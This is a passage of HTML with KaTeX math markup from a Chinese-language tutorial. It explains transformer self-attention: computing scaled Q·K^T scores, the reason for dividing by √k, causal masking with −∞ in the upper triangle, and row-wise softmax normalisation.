xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>x</mi><mi>i</mi><mi>q</mi></msubsup><mo>=</mo><mi>Q</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo separator="true">,</mo><msubsup><mi>x</mi><mi>i</mi><mi>k</mi></msubsup><mo>=</mo><mi>K</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo separator="true">,</mo><msubsup><mi>x</mi><mi>i</mi><mi>v</mi></msubsup><mo>=</mo><mi>V</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">x_{i}^{q}= Q[i],x_{i}^{k}= K[i],x_{i}^{v}= V[i]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0592em;vertical-align:-0.2769em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7823em;"><span style="top:-2.4231em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span style="top:-3.1809em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2769em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.1078em;vertical-align:-0.2587em;"/><span class="mord mathnormal">Q</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-2.4413em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2587em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.0087em;vertical-align:-0.2587em;"/><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4413em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2587em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span></span></span></span></span></p>
<p>接下来，我们计算注意力权重。核心思想是计算每一对 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msubsup><mi>x</mi><mi>i</mi><mi>q</mi></msubsup><mo separator="true">,</mo><msubsup><mi>x</mi><mi>j</mi><mi>k</mi></msubsup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(x^q_i, x^k_j)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2439em;vertical-align:-0.3948em;"/><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7823em;"><span style="top:-2.4231em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.1809em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2769em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-2.4413em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3948em;"><span/></span></span></span></span></span><span class="mclose">)</span></span></span></span></span> 的相似度，这可以通过矩阵乘法高效完成。</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>P</mi><mo>=</mo><mfrac><mrow><mi>Q</mi><mo>⋅</mo><msup><mi>K</mi><mi>T</mi></msup></mrow><msqrt><mi>k</mi></msqrt></mfrac><mtext>   </mtext><mo stretchy="false">(</mo><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi><mo separator="true">,</mo><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">P = \frac{Q \cdot K^T }{\sqrt{k}}\space\space\space (seq\_len,seq\_len)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:2.4483em;vertical-align:-0.93em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.5183em;"><span style="top:-2.1778em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9322em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="mord" style="padding-left:0.833em;"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span><span style="top:-2.8922em;"><span class="pstrut" style="height:3em;"/><span class="hide-tail" style="min-width:0.853em;height:1.08em;"><svg xmlns="http://www.w3.org/2000/svg" width="400em" height="1.08em" viewbox="0 0 400000 1080" preserveaspectratio="xMinYMin slice"><path d="M95,702&#10;c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14&#10;c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54&#10;c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10&#10;s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429&#10;c69,-144,104.5,-217.7,106.5,-221&#10;l0 -0&#10;c5.3,-9.3,12,-14,20,-14&#10;H400000v40H845.2724&#10;s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7&#10;c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47z&#10;M834 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1078em;"><span/></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal">Q</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.93em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mspace"> </span><span class="mspace"> </span><span class="mspace"> </span><span class="mopen">(</span><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></span></div>
<p>矩阵 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span></span> 的每个元素 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>P</mi><mrow><mi>i</mi><mi>j</mi></mrow></msub></mrow><annotation encoding="application/x-tex">P_{ij}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">ij</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span> 表示第 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"/><span class="mord mathnormal">i</span></span></span></span></span> 个位置的查询向量 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>x</mi><mi>i</mi><mi>q</mi></msubsup></mrow><annotation encoding="application/x-tex">x^q_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0592em;vertical-align:-0.2769em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7823em;"><span style="top:-2.4231em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.1809em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2769em;"><span/></span></span></span></span></span></span></span></span></span> 与第 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span></span> 个位置的键向量 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>x</mi><mi>j</mi><mi>k</mi></msubsup></mrow><annotation encoding="application/x-tex">x^k_j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2439em;vertical-align:-0.3948em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-2.4413em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3948em;"><span/></span></span></span></span></span></span></span></span></span> 之间的原始注意力得分（或称相似度）。</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/316d4617ab944f6fa53696dc5d60e210~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=2s7jvieGhnIjAHF7BrzaSXYslTY%3D" alt="c18.jpg" width="100%" loading="lazy"/></p>
<p>这里之所以要除以一个缩放因子<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msqrt><mi>k</mi></msqrt></mrow><annotation encoding="application/x-tex">\sqrt{k}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.04em;vertical-align:-0.1078em;"/><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9322em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="mord" style="padding-left:0.833em;"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span><span style="top:-2.8922em;"><span class="pstrut" style="height:3em;"/><span class="hide-tail" style="min-width:0.853em;height:1.08em;"><svg xmlns="http://www.w3.org/2000/svg" width="400em" height="1.08em" viewbox="0 0 400000 1080" preserveaspectratio="xMinYMin slice"><path d="M95,702&#10;c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14&#10;c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54&#10;c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10&#10;s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429&#10;c69,-144,104.5,-217.7,106.5,-221&#10;l0 -0&#10;c5.3,-9.3,12,-14,20,-14&#10;H400000v40H845.2724&#10;s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7&#10;c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47z&#10;M834 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1078em;"><span/></span></span></span></span></span></span></span></span>，主要是在应用 softmax 之前稳定梯度的传播，为了确保计算稳定；当我们设置的 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span></span> 较大时，点积 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi><mo>⋅</mo><mi>k</mi></mrow><annotation encoding="application/x-tex">q \cdot k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6389em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span></span> 的绝对值可能会变得很大，这会导致 softmax 函数的梯度趋近于零（饱和区），从而引发梯度消失问题。缩放操作能够有效缓解这一现象，确保训练过程的稳定性。</p>
<p>如果此时你需要实现<strong>掩码注意力</strong>（如解码器中所用），此时的操作将变得异常简单，令矩阵<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span></span>的上三角区域的值全为负无穷或者一个极大的负数即可（通常取<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><mn>1</mn><msup><mn>0</mn><mn>9</mn></msup><mtext> or </mtext><mo>−</mo><mtext>inf</mtext></mrow><annotation encoding="application/x-tex">-10^9 \space \text{or} \space -\text{inf}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"/><span class="mord">−</span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">9</span></span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord text"><span class="mord">or</span></span><span class="mspace"> </span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord text"><span class="mord">inf</span></span></span></span></span></span>）,除此之外，再无需其他任何操作，简单方便。</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>P</mi><mrow><mi>m</mi><mi>a</mi><mi>s</mi><mi>k</mi><mi>e</mi><mi>d</mi></mrow></msub><mo stretchy="false">[</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">]</mo><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.16em" columnalign="center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>P</mi><mo stretchy="false">[</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">]</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>j</mi><mo>≤</mo><mi>i</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mi mathvariant="normal">∞</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>j</mi><mo>&gt;</mo><mi>i</mi></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">P_{masked}[i,j] = \left\{\begin{matrix}

 P[i,j] &amp; j\le i\\
 -\infty  &amp; j&gt; i
\end{matrix}\right.</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ma</span><span class="mord mathnormal mtight">s</span><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">d</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:2.4em;vertical-align:-0.95em;"/><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">{</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord">−</span><span class="mord">∞</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mord mathnormal">i</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mord mathnormal">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span/></span></span></span></span></span></span><span class="mclose nulldelimiter"/></span></span></span></span></span></div>
<p>随后，我们对矩阵 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span></span>（或 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>P</mi><mrow><mi>m</mi><mi>a</mi><mi>s</mi><mi>k</mi><mi>e</mi><mi>d</mi></mrow></msub></mrow><annotation encoding="application/x-tex">P_{masked}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ma</span><span class="mord mathnormal mtight">s</span><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">d</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>）的<strong>每一行</strong>应用 softmax 函数进行归一化，确保每一行的所有权重之和为 1，从而得到最终的注意力权重矩阵 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span></span>：</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>S</mi><mo>=</mo><mtext>softmax</mtext><mo stretchy="false">(</mo><mi>P</mi><mo separator="true">,</mo><mtext>dim</mtext><mo>=</mo><mn>1</mn><mo stretchy="false">)</mo><mtext>   </mtext><mo stretchy="false">(</mo><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi><mo separator="true">,</mo><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">S = \text{softmax}(P,\text{dim}=1) \space \space \space (seq\_len,seq\_len)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord text"><span class="mord">softmax</span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord text"><span class="mord">dim</span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"/><span class="mord">1</span><span class="mclose">)</span><span class="mspace"> </span><span class="mspace"> </span><span class="mspace"> </span><span class="mopen">(</span><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></span></div>
